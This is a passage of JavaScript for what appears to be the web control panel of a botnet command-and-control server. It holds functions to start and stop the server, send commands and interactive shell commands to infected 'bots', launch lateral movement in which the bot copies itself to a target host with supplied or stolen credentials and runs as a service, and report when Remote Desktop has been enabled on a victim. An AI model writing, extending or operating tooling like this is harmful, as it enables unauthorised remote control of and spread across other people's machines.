                `;
            }
            
        } else {
            showNotification('Error: ' + (data.error || 'Unknown error'), 'error');
        }
    })
    .catch(error => {
        console.error('Error starting server:', error);
        showNotification('Connection error: ' + error.message, 'error');
    });
}

function stopServer() {
    console.log("Stop server clicked");
    
    if (!confirm("Are you sure you want to stop the C2 server? All connections will be lost.")) {
        return;
    }
    
    fetch('/api/stop', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        }
    })
    .then(response => {
        if (!response.ok) {
            throw new Error(`HTTP error! Status: ${response.status}`);
        }
        return response.json();
    })
    .then(data => {
        console.log("Stop server response:", data);
        if (data.success) {
            showNotification('C2 Server stopped', 'warning');
            
            const serverStatus = document.getElementById('server-status');
            const serverText = document.getElementById('server-text');
            
            if (serverStatus) {
                serverStatus.className = 'status-dot offline';
            }
            
            if (serverText) {
                serverText.textContent = 'C2 Server: Stopped';
            }
            
            serverRunning = false;
            updateButtonStates();
            
            const botList = document.getElementById('bot-list');
            if (botList) {
                botList.innerHTML = '';
            }
            selectedBots = [];
            updateBotCount();
            updateSelectedCount();
            
            const outputArea = document.getElementById('output-area');
            if (outputArea) {
                outputArea.innerHTML = `
                    <div class="welcome-message">
                        <h3><i class="fas fa-satellite-dish"></i> C2 Server Stopped</h3>
                        <p>Click "Start C2" to start the server again.</p>
                        <p><strong>Bot Connection Port:</strong> 8080</p>
                        <p><strong>Bot Command:</strong> bot.exe YOUR_IP 8080</p>
                    </div>
                `;
            }
            
        } else {
            showNotification('Error: ' + (data.error || 'Unknown error'), 'error');
        }
    })
    .catch(error => {
        console.error('Error stopping server:', error);
        showNotification('Error: ' + error.message, 'error');
    });
}

// Send Commands
function sendCommandToSelected(command, type = 'custom') {
    console.log(`Sending command to selected bots: ${command}, type: ${type}`);
    
    if (!serverRunning) {
        showNotification('C2 Server is not running', 'error');
        return;
    }
    
    if (selectedBots.length === 0) {
        showNotification('No bots selected', 'warning');
        return;
    }
    
    fetch('/api/command', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            target: 'selected',
            type: type,
            params: { cmd: command }
        })
    })
    .then(response => {
        if (!response.ok) {
            throw new Error(`HTTP error! Status: ${response.status}`);
        }
        return response.json();
    })
    .then(data => {
        if (!data.success) {
            showNotification('Error: ' + (data.error || 'Unknown error'), 'error');
        } else {
            showNotification(`Command sent to ${selectedBots.length} bot(s)`, 'success');
        }
    })
    .catch(error => {
        console.error('Error sending command:', error);
        showNotification('Error sending command: ' + error.message, 'error');
    });
}

// Shell Functions
function sendShellCommand() {
    const input = document.getElementById('shell-command-input');
    if (!input) return;
    
    const command = input.value.trim();
    console.log("Sending shell command:", command);
    
    if (!command) {
        showNotification('Please enter a shell command', 'warning');
        return;
    }
    
    if (command.toLowerCase() === 'exit') {
        exitShellMode();
        return;
    }
    
    fetch('/api/command', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            target: 'shell',
            type: 'shell_command',
            params: { cmd: command }
        })
    })
    .then(response => {
        if (!response.ok) {
            throw new Error(`HTTP error! Status: ${response.status}`);
        }
        return response.json();
    })
    .then(data => {
        if (data.success) {
            input.value = '';
            input.focus();
        } else {
            showNotification('Error: ' + (data.error || 'Unknown error'), 'error');
        }
    })
    .catch(error => {
        console.error('Error sending shell command:', error);
        showNotification('Error: ' + error.message, 'error');
    });
}

function exitShellMode() {
    console.log("Exiting shell mode");
    const shellContainer = document.getElementById('shell-input-container');
    const shellStatus = document.getElementById('shell-status');
    
    if (shellContainer) {
        shellContainer.style.display = 'none';
    }
    
    if (shellStatus) {
        shellStatus.textContent = 'Shell: Off';
    }
    
    currentShellBot = null;
    showNotification('Exited shell mode', 'success');
}

function updateShellMode(data) {
    console.log("Updating shell mode:", data);
    const shellContainer = document.getElementById('shell-input-container');
    const shellStatus = document.getElementById('shell-status');
    const shellBotName = document.getElementById('shell-bot-name');
    
    if (data.active) {
        if (shellContainer) {
            shellContainer.style.display = 'block';
        }
        
        if (shellStatus) {
            shellStatus.textContent = 'Shell: Active';
        }
        
        currentShellBot = data.bot_id;
        
        const botElement = document.querySelector(`.bot-item[data-bot-id="${data.bot_id}"]`);
        if (botElement && shellBotName) {
            const nameElement = botElement.querySelector('.bot-name');
            shellBotName.textContent = nameElement ? nameElement.textContent.trim() : 'Unknown';
        }
        
        const shellInput = document.getElementById('shell-command-input');
        if (shellInput) {
            shellInput.focus();
        }
        
        showNotification('Entered shell mode', 'success');
    } else {
        if (shellContainer) {
            shellContainer.style.display = 'none';
        }
        
        if (shellStatus) {
            shellStatus.textContent = 'Shell: Off';
        }
        
        currentShellBot = null;
        showNotification('Exited shell mode', 'success');
    }
}

// Output Display
function displayOutput(data) {
    console.log("Displaying output:", data);
    const outputArea = document.getElementById('output-area');
    if (!outputArea) return;
    
    if (outputArea.children.length === 1 && outputArea.children[0].classList.contains('welcome-message')) {
        outputArea.innerHTML = '';
    }
    
    const outputLine = document.createElement('div');
    outputLine.className = 'output-line bot';
    outputLine.innerHTML = `
        <strong>[${new Date().toLocaleTimeString()}] Bot ${data.bot_id}:</strong><br>
        ${escapeHtml(data.output)}
    `;
    
    outputArea.appendChild(outputLine);
    outputArea.scrollTop = outputArea.scrollHeight;
    
    const lastActivity = document.getElementById('last-activity');
    if (lastActivity) {
        lastActivity.textContent = `Last: ${new Date().toLocaleTimeString()}`;
    }
}

// Event Management
function addEvent(event) {
    console.log("Adding event:", event);
    events.push(event);
    
    const eventList = document.getElementById('event-list');
    if (!eventList) return;
    
    const eventElement = document.createElement('div');
    eventElement.className = `event-item ${event.level}`;
    eventElement.innerHTML = `
        <div class="event-header">
            <div class="event-title">${event.title}</div>
            <div class="event-time">${event.time}</div>
        </div>
        <div class="event-message">${event.message}</div>
    `;
    
    eventList.appendChild(eventElement);
    eventList.scrollTop = eventList.scrollHeight;
    
    updateEventCount();
}

function clearEvents() {
    console.log("Clearing events");
    events = [];
    const eventList = document.getElementById('event-list');
    if (eventList) {
        eventList.innerHTML = '';
    }
    updateEventCount();
    showNotification('Events cleared', 'success');
}

function filterEvents(filter) {
    console.log("Filtering events:", filter);
    const eventItems = document.querySelectorAll('.event-item');
    const filterButtons = document.querySelectorAll('.filter-btn');
    
    filterButtons.forEach(btn => {
        if (btn.getAttribute('data-filter') === filter) {
            btn.classList.add('active');
        } else {
            btn.classList.remove('active');
        }
    });
    
    eventItems.forEach(item => {
        if (filter === 'all' || item.classList.contains(filter)) {
            item.style.display = 'flex';
        } else {
            item.style.display = 'none';
        }
    });
}

function showLateralMovementPopup() {
    console.log("Showing lateral movement popup");
    
    const modalBackdrop = document.createElement('div');
    modalBackdrop.id = 'lateral-modal';
    modalBackdrop.style.cssText = `
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background-color: rgba(0, 0, 0, 0.8);
        z-index: 9999;
        display: flex;
        justify-content: center;
        align-items: center;
    `;

    const modalContent = document.createElement('div');
    modalContent.style.cssText = `
        background-color: #0d1117;
        border: 1px solid #30363d;
        border-radius: 8px;
        padding: 30px;
        width: 500px;
        box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
    `;

    modalContent.innerHTML = `
        <h2 style="color:#f0883e;margin-bottom:20px;text-align:center;">Lateral Movement</h2>
        <div style="margin-bottom:15px;">
            <label style="display:block;margin-bottom:5px;color:#c9d1d9;">Target IP/Hostname:</label>
            <input type="text" id="lateral-target" placeholder="192.168.1.100" style="width:100%;padding:10px;background:#161b22;border:1px solid #30363d;border-radius:4px;color:#f0f6fc;">
        </div>
        <div style="margin-bottom:15px;">
            <label style="display:block;margin-bottom:5px;color:#c9d1d9;">Username (optional):</label>
            <input type="text" id="lateral-username" placeholder="Administrator" style="width:100%;padding:10px;background:#161b22;border:1px solid #30363d;border-radius:4px;color:#f0f6fc;">
        </div>
        <div style="margin-bottom:15px;">
            <label style="display:block;margin-bottom:5px;color:#c9d1d9;">Password (optional):</label>
            <input type="password" id="lateral-password" placeholder="P@ssw0rd" style="width:100%;padding:10px;background:#161b22;border:1px solid #30363d;border-radius:4px;color:#f0f6fc;">
        </div>
        <div style="margin-bottom:25px;">
            <div style="background:#161b22;border:1px solid #30363d;border-radius:4px;padding:10px;color:#8b949e;">
                <strong>Note:</strong> The bot will copy itself to the target and run as a service.<br>
                If credentials are omitted, the current token is used.
            </div>
        </div>
        <div style="display:flex;gap:10px;">
            <button id="lateral-cancel" style="flex:1;padding:10px;background:#21262d;border:1px solid #30363d;border-radius:4px;color:#c9d1d9;cursor:pointer;">Cancel</button>
            <button id="lateral-execute" style="flex:1;padding:10px;background:#da3633;border:1px solid #f85149;border-radius:4px;color:white;cursor:pointer;">Execute</button>
        </div>
    `;

    modalBackdrop.appendChild(modalContent);
    document.body.appendChild(modalBackdrop);

    document.getElementById('lateral-cancel').onclick = () => document.body.removeChild(modalBackdrop);
    document.getElementById('lateral-execute').onclick = () => {
        const target = document.getElementById('lateral-target').value.trim();
        const username = document.getElementById('lateral-username').value.trim();
        const password = document.getElementById('lateral-password').value.trim();

        if (!target) {
            alert('Please enter a target IP or hostname');
            return;
        }

        // Build command string
        let cmd = `lateral ${target}`;
        if (username) {
            cmd += ` ${username}`;
            if (password) {
                cmd += ` ${password}`;
            }
        }

        document.body.removeChild(modalBackdrop);

        fetch('/api/command', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                target: 'selected',
                type: 'custom',
                params: { cmd: cmd }
            })
        })
        .then(response => response.json())
        .then(data => {
            if (data.success) {
                showNotification(`Lateral movement command sent to ${target}`, 'success');
            } else {
                showNotification('Error: ' + (data.error || 'Unknown error'), 'error');
            }
        })
        .catch(error => {
            console.error('Error sending lateral command:', error);
            showNotification('Error: ' + error.message, 'error');
        });
    };

    document.getElementById('lateral-target').focus();
}

// RDP Handler
function handleRDPReady(data) {
    console.log("Handling RDP ready:", data);
    const event = {
        time: new Date().toLocaleTimeString(),
        title: 'RDP Enabled',
        message: `Remote Desktop enabled on ${data.ip}. Use mstsc /v:${data.ip}`,
        level: 'rdp'
    };
    
    addEvent(event);
    showNotification(`RDP enabled on ${data.ip}`, 'success');
}

// Status Updates
function updateStatusDisplay(data) {
    console.log("Updating status display:", data);
    
    const connectedBots = document.getElementById('connected-bots');
    const botCount = document.getElementById('bot-count');
    const selectedCount = document.getElementById('selected-count');
    
    if (connectedBots) {
        connectedBots.textContent = `Bots: ${data.total_bots || 0}`;
    }
    
    if (botCount) {
        botCount.textContent = data.total_bots || 0;
    }
    
    if (selectedCount) {
        selectedCount.textContent = `${data.selected_bots || 0} selected`;
    }
    
    if (data.server_running) {
        serverRunning = true;
        const serverStatus = document.getElementById('server-status');
        const serverText = document.getElementById('server-text');
        
        if (serverStatus) {
            serverStatus.className = 'status-dot online';
        }
        
        if (serverText) {
            serverText.textContent = `C2 Server: Running (${data.current_ip || '0.0.0.0'}:${data.current_port || 8080})`;
        }
    } else {
        serverRunning = false;
        const serverStatus = document.getElementById('server-status');
        const serverText = document.getElementById('server-text');
        
        if (serverStatus) {
            serverStatus.className = 'status-dot offline';
        }
        
        if (serverText) {
            serverText.textContent = 'C2 Server: Stopped';
        }
    }
    
    updateButtonStates();
}

function updateServerStatus(data) {
    console.log("Updating server status:", data);
    
    if (data.status === 'running') {
        serverRunning = true;
        const serverStatus = document.getElementById('server-status');
        const serverText = document.getElementById('server-text');
        
        if (serverStatus) {
            serverStatus.className = 'status-dot online';
        }
        
        if (serverText) {
            serverText.textContent = `C2 Server: Running (${data.host || '0.0.0.0'}:${data.port || 8080})`;
        }
    } else if (data.status === 'stopped') {
        serverRunning = false;
        const serverStatus = document.getElementById('server-status');
        const serverText = document.getElementById('server-text');
        
        if (serverStatus) {
            serverStatus.className = 'status-dot offline';
        }
        
        if (serverText) {
            serverText.textContent = 'C2 Server: Stopped';
        }
    }
    
    updateButtonStates();
}

function updateSocketStatus(connected) {
    console.log("Updating socket status:", connected);
    const statusMessage = document.getElementById('status-message');
    if (statusMessage) {
        if (connected) {
            statusMessage.textContent = 'Connected';
            statusMessage.style.color = '#3fb950';
        } else {
            statusMessage.textContent = 'Disconnected';
            statusMessage.style.color = '#f85149';
        }
    }
}

function updateBot(bot) {
    const botElement = document.querySelector(`.bot-item[data-bot-id="${bot.id}"]`);
    if (!botElement) return;
    
    const botName = botElement.querySelector('.bot-name');
    const botStatus = botElement.querySelector('.bot-status');
    
    if (botName) {
        botName.innerHTML = `<i class="fas fa-robot"></i> ${bot.info.hostname || bot.ip}`;
    }
    
    if (botStatus) {
        botStatus.textContent = bot.status || 'connected';
    }
    
    if (bot.selected) {
        botElement.classList.add('selected');
        if (!selectedBots.includes(bot.id)) {
            selectedBots.push(bot.id);
        }
    } else {
        botElement.classList.remove('selected');
        selectedBots = selectedBots.filter(id => id !== bot.id);
    }
    
    updateSelectedCount();
}

function updateSelectedCount() {
    const count = document.querySelectorAll('.bot-item.selected').length;
    const selectedCount = document.getElementById('selected-count');
    
    if (selectedCount) {
        selectedCount.textContent = `${count} selected`;
    }
}

function updateBotCount() {
    const count = document.querySelectorAll('.bot-item').length;
    const botCount = document.getElementById('bot-count');
    
    if (botCount) {
        botCount.textContent = count;
    }
    
    const connectedBots = document.getElementById('connected-bots');
    if (connectedBots) {
        connectedBots.textContent = `Bots: ${count}`;
    }
}

function updateEventCount() {
    const count = events.length;
    // Can add event count display if needed
}

function loadStatus() {
    fetch('/api/status')
        .then(response => response.json())
        .then(data => {
            updateStatusDisplay(data);
        })
        .catch(error => {
            console.error('Error loading status:', error);
        });
}

// Helper Functions
function showNotification(message, type) {
    console.log(`Showing notification: ${message}, type: ${type}`);
    
    document.querySelectorAll('.notification').forEach(notification => {
        notification.remove();
    });
    
    const notification = document.createElement('div');
    notification.className = `notification ${type}`;
    notification.innerHTML = `
        <i class="fas fa-${getNotificationIcon(type)}"></i>
        <span>${message}</span>
    `;
    
    document.body.appendChild(notification);
    
    setTimeout(() => {
        if (notification.parentNode) {
            notification.parentNode.removeChild(notification);
        }
    }, 3000);
}

function getNotificationIcon(type) {
    switch(type) {
        case 'success': return 'check-circle';
        case 'error': return 'exclamation-circle';
        case 'warning': return 'exclamation-triangle';
        default: return 'info-circle';
    }
}

function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}